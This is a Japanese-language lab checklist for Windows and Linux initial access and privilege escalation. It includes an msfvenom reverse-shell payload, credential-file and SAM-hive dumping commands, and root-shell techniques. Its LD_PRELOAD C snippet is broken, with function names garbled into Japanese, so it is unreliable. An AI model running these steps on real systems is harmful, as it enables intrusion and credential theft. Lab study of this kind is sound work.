# Labを解く際のチェックリスト

# Windows

## 初期侵入
1. rpcclientを使って匿名ログインができないか
2. SMB共有への匿名ログインができないか
3. FTPへの匿名ログインができないか
4. NFSを使っている場合、ターゲットのディレクトリをローカルにマウントできないか
5. ADのドメイン名はnmapのDCから確認できたか
6. Webアプリケーションへのログインで、デフォルトパスワードとadmin adminは試したか
7. WordPressを使っている場合、pluginの脆弱性はないか
8. WordPressを使っている場合、PHPファイルの書き換えからRCEにつなげられないか
9. パストラバーサルの脆弱性がある場合、SSHの秘密鍵をアップロードで書き換えられないか
10. nmapでldapスキャンをしてユーザ名を取得後、impacket-GetNPUsersでパスワードスプレーでAS-repできないか
11. /apiエンドポイントが見つかった場合、その配下に何か興味深いエンドポイントが無いか。このとき、wordlistsはcommon.txtだけでなくbig.txt、dirbusterディレクトリ配下のmedium.txt等複数試したか。特にmedium.txtかsmall.txtはwordの数が多いのでガチでやるときに良い。
12. nmapで?になってるポートに対して以下を実行して、ターゲットのサービスとバージョン等を確認できないか。
```
nc -nv 192.168.219.143 3003
help
version
```
13. ncでシェルを取るとき、Outboundの宛先ポートは、ターゲットが許可しそうなポートか。盲目的に4444等をすると、コマンド実行はできてるのにシェルを取れない謎現象で詰まる。ターゲットをnmapしたときにopenなポートを使ってncで待ち受けとくとシェルを取れる確率が上がる。

## 権限昇格
1. sudo -lで、パスワードなしでroot権限実行できるコマンドは無いか
2. idコマンドで、現在ログイン中のユーザはどこのグループに属しているか
3. 自分のユーザをAdminグループにaddできないか
4. nanoやviなどがpwなしroot権限で実行できないか、これでrootのプライベートキー等の任意のファイルを上書きできないか
5. Users\, Public\, Desktop\ その他ウェブ系ツールなどのフォルダ配下に、*.kdbg, *.txtといったパスワードが記載されてそうなファイルはないか
6. (Get-PSReadlineOption).HistorySavePathコマンドで、PSReadlineモジュールが記録したPowerShellのコマンド履歴に認証情報が置いてないか
7. Public\配下にtranscriptファイルが置かれていないか
8. GUIアクセスできる場合、イベントビューア > Application and Service Log > Microsoft > Windows > PowerShell > Operationalにスクリプトログが残されていないか、そこに認証情報が無いか
9. Windowsサービスに紐づいたバイナリファイルに、全ユーザに対してのフルアクセス権限が割り当てられており、バイナリファイル、もしくはDLLを書き換えられないか。
```
sc qc apphostsvc # apphostsvcのサービスにクエリを送ってサービス状態を確認する。
icacls <apphostsvcバイナリのファイルパス> #これで変更権限があればシェルをとれるかも。
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.13.58.5 LPORT=4444 -f exe-service -o rev-svc.exe # Kali側で、権限が弱いサービスに紐づいたバイナリを置き換えるためのペイロードを生成する。
```
10. ダブルクオーテーションで囲まれていないサービスにリンクされたバイナリのファイルが存在し、そのバイナリが存在するパスへの書き込み権限はないか。
```

```

11. SeImpersonatePrivilegeの権限が有効になっていないか
12. 自分がアクセスできるユーザが、SIDをコンバートしたときに、ドメイン内でGenericAllのような強力なユーザを持っていないか
13. ドメイン共有内の古いポリシーファイルの.xmlファイルに、GPP(Group Policy Preference)のパスワードがないか
14. Kerberos preauthenticationが無効になっているアカウントがドメイン内にないか。それがあれば、Rubeusやimpacket-GetNPUsersを使ってAS-REP Roasting攻撃を使ってユーザのパスワードをクラックできる可能性がある。
15. 無人インストールで利用される以下のファイルに認証情報が残っていないか。
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
16. whoami /privでトークン権限を確認後、EnableAllTokenPrivs.ps1のツールを使って全てをenabledにする。その後、そのトークンを使って権限昇格ができないか。
17. PuttyがWindwosにインストールされている場合、reg queryコマンドで別ユーザの認証情報を取得できないか
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
18. Powershellのコマンド履歴として以下のパスから平文のパスワードを取得できないか。
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
19. Windowsに保存されている資格情報の取得や利用を試みたか。
```
cmdkey /list
runas /savecred /user:admin cmd.exe
```
20. IISがインストールされている場合、web.configに認証情報はなかったか。  
web.configの場所は以下のいずれか。
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```  
以下のコマンドでweb.configから認証情報を検索できる。
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

21. SeBackupとSeResoterの権限が割り当てられていないか、権限が有効な場合、SAMハッシュとSYSTEMハッシュをダンプできる。
```
whoami /priv
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
22. 実行されるタスクに含まれるパラメータ(Run as User)と、そのタスクを実行するユーザが誰か。(Task to Run)  
別ユーザによって実行されていて、かつicaclsでバイナリをチェックしたときに書き込み可能なら、バイナリを置き換えて権限昇格ができるかも。
```
schtasks /query /tn vulntask /fo list /v
icacls C:\tasks\schtask.bat
C:\> schtasks /run /tn vulntask
# スケジュールタスクの確認 => タスクへの権限チェック => タスクの手動実行
```

23. SeTakeOwnershipが有効になっていないか。utilman.exeを書き換えてロック画面からSYSTEM権限のcmd.exeを起動できる可能性がある。

===========

# Linux

## 初期侵入
1. nmapをする。-sC(TCP)と-sU(UDPスキャン)をそれぞれ必ず実行する
2. ffufを--recursionで行う。wordlistsは/usr/share/wordlists/dirbuster/small.txt
3. nc -nvでnmapに引っかからなかったサービスの正確なバージョンを特定する
4. ポート80が動いていたら手動でWebアプリケーションの列挙を行う
5. snmpが動いていた場合、v1ならコミュニティ文字列publicを使って書き込みからRCEができないか

## 権限昇格
1. /home/user配下に.bash_historyがないか、また、その中に認証情報等が平文で書かれていないか
2. /home/usr/.bashrc内にセットされている環境変数に、認証情報がは無いか
3. cronにスケジュールされいるファイルの中に、現在のユーザで書き込みができ、rootでcronの実行権限があるファイルはないか。  
```
ls -lah /etc/cron*
sudo crontab -l
```  
また、crontabはどのユーザでも確認することができる。/etc/crontabを確認し、rootによって実行される予定のあるタスクが無いかをチェックする。  
ここで定義されている.shスクリプトがあり、かつそのファイルパスが指定されておらずPATHの環境変数内に書き込み権限があれば、同名のshファイルを書き込むことでroot実行される。  
もしくは、.shファイルの最終行にリバースシェルのスクリプトを書き込むとか。
```
cat /etc/crontab
```

3. /etc/passwdに書き込めれば、shadowよりも優先して認証に使われるため、任意のアカウントに任意のパスワードを設定できる。/etc/passwdに書き込み権限はないか。書き換えられる場合、以下でパスワードハッシュを生成してx部分を置き換えることでrootにhogeパスワードで入れるようになる。
```
openssl passwd hoge
```

4. kernel exploitは機能するか。以下のコマンドでOSとカーネルの情報を取得して脆弱性を検索できる。  
ただしkernel exploitを実行するとマシンがぶっ壊れる可能性があるので最後の手段としておく。
```
uname -a
cat /proc/version
cat /etc/issue
```

5. sudoのバージョンを確認し、そのバージョン自体にLPEの脆弱性が無いか。
6. 以下のコマンドで書き込み可能なファイルが、cronによってroot実行されるものではないか。
```
crontab -l
ls -lah /etc/cron*
find / -writable -type d 2>/dev/null
```
7. SUIDがセットされているバイナリファイルを現在のユーザから実行できないか。  
SUIDがセットされているファイルは以下で検索できる。  
SUIDがセットされていてroot権限で実行できるバイナリが見つかったら、[GTFObin](https://gtfobins.github.io/)でそのバイナリを使った権限昇格の手法が無いかを探す。
```
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```

8. /etc/sudoersに書き込み権限がないか。

9. /opt配下にバックアップファイルなどが無いか。バックアップされた過去のファイルから認証情報を取得できる可能性がある。

10. pspyを実行してみて、パイプを使った怪しいプロセスなどが無いか。また、プロセスの引数に認証情報があったり誰でも読み書きできる.shファイルをroot権限で実行していたりしないか。

11. 念のため、historyコマンドで過去の認証情報を確認したか

12. sudo権限でnmapを実行できないか。以下を使うとroot shellをとれる。
```
sudo nmap --interactive
```

13. sudo -lしたときに、env_keepオプションが有効で、かつ環境変数にLD_PRELOADが含まれていないか。LD_PRELOADは、プログr舞うの実行前にロードおよび実行される共有ライブラリを生成できる。  
上記の条件を満たしている場合、.soファイル(共有オブジェクト)としてコンパイルされたCコードを作ってからsudoと.soファイルを指すLD_PRELOADオプションを使ってプログラムをコンパイルして実行する。以下のCコードでは、rootシェルを生成できる。  
コンパイルは以下のコマンドを使う。  
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
```.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
セットID(0);
システム("/bin/bash");
}
```
最終的に、以下のようにしてコマンドを実行する。  
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

14. SUIDセットなどによってbase64コマンドをroot権限で実行できないか。これができる場合、任意のファイルを読み取ることができる。
```
base64 /hoge.txt | base64 --decode
```

15. Capabilityのセットされたバイナリはないか。capabilityはSUIDチェックに引っかからないので注意。  
以下のコマンドでシステム全体のCapabilityをチェックできる。
```
getcap -r / 2> /dev/null
```

16. echo $PATHで出力した環境変数のパス内に書き込み権限が存在しないか。書き込み権限がある場合、バイナリを置き換えてrootへの昇格ができる場合がある。